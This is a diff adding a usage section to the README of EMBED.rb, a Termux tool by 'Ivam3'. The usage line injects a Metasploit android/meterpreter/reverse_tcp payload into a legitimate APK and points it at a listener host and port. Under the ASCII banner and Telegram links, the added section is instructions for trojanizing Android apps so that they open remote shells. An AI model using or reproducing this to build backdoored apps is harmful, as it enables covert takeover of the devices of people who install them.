@@ -31,4 +31,19 @@ This file will install and configure Termux with all the required libraries and 
 
 This software and related documentation are provided under license agreement containing in www.java.com. Please refer to http://java.com/licensereadme.
 
+# USAGE
+
+	$ ruby EMBED.rb PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546
+
+	._____ __  __ ____  _____ ____
+	| ____|  \/  | __ )| ____|  _ \
+	|  _| |TERMUX|  _ \|  _| | | | |
+	| |___| |\/| | |_) | |___| |_| |
+	|_____|_|  |_|____/|_____|____/ v.2
+	#:::::::: By Ivam3 ::::::::::::#
+
+	[Usage]─➤ EMBED.rb [target.apk] [msfvenom options]
+
+This tool was written by Ivam3, <https://t.me/Ivam3byCinderella>
+Some maintenance releases have been done by <https://t.me/Ivam3_Bot>
 
